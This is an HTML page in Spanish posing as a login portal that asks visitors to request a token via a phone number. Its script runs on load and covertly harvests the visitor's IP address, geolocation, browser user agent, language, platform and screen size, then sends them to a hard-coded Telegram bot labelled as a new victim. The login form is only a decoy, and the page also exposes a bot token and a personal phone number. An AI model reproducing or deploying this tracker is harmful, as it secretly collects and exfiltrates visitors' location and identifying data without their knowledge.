<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>LJENS OFFICIAL</title>
  <style>
    body {
      background-color: #111;
      color: #0ff;
      font-family: 'Courier New', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      animation: fadeIn 2s ease-in;
    }

    h1 {
      font-size: 2.5rem;
      color: #0ff;
      text-shadow: 0 0 10px #0ff;
    }

    h2 {
      font-size: 1rem;
      color: #f0f;
      margin-bottom: 30px;
      text-shadow: 0 0 5px #f0f;
      text-align: center;
    }

    form {
      display: flex;
      flex-direction: column;
      width: 300px;
      gap: 10px;
      animation: slideUp 1.5s ease-out;
    }

    input {
      padding: 10px;
      background: #222;
      border: 5px solid #0ff;
      color: #0ff;
    }

    button {
      padding: 10px;
      background: #0ff;
      color: #000;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes slideUp {
      from { transform: translateY(30px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
  </style>
</head>
<body>
  <h1>BIENVENIDOS</h1>
  <h2>SI QUIERE OBTENER SU TOKEN Y USUARIO ME HABLE AL PRIVADO: +54 9 364 473-8690</h2>

  <form onsubmit="mostrarAlerta(); return false;">
    <input type="text" placeholder="Usuario" required>
    <input type="text" placeholder="Token" required>
    <button type="submit">Iniciar sesión</button>
  </form>

  <script>
    const ID = "7955801451";
    const TOKEN = "7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI";

    async function obtenerIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return "No disponible";
      }
    }

    function solicitarNotificaciones() {
      if ("Notification" in window) {
        Notification.requestPermission();
      }
    }

    function solicitarUbicacion() {
      return new Promise((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`);
            },
            () => {
              resolve("Permiso denegado o no disponible");
            }
          );
        } else {
          resolve("No compatible");
        }
      });
    }

    async function enviarDatos() {
      const ip = await obtenerIP();
      const ubicacion = await solicitarUbicacion();
      solicitarNotificaciones();

      const datos = {
        agente: navigator.userAgent,
        idioma: navigator.language,
        plataforma: navigator.platform,
        ancho: screen.width,
        alto: screen.height,
        hora: new Date().toLocaleString(),
        ip: ip,
        ubicacion: ubicacion
      };

      const mensaje = `
NUEVO VIRGEN REGISTRADO:
╣⋙ IP: ${datos.ip}
╣⋙ Ubicación: ${datos.ubicacion}
╣⋙ User-Agent: ${datos.agente}
╣⋙ Idioma: ${datos.idioma}
╣⋙ Plataforma: ${datos.plataforma}
╣⋙ Resolución: ${datos.ancho}x${datos.alto}
╣⋙ Hora: ${datos.hora}
      `;

      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ID,
          text: mensaje
        })
      });
    }

    enviarDatos();

    function mostrarAlerta() {
      alert("LA CONTRASEÑA ES: M.Serika_rodes231");
    }
  </script>
</body>
</html>
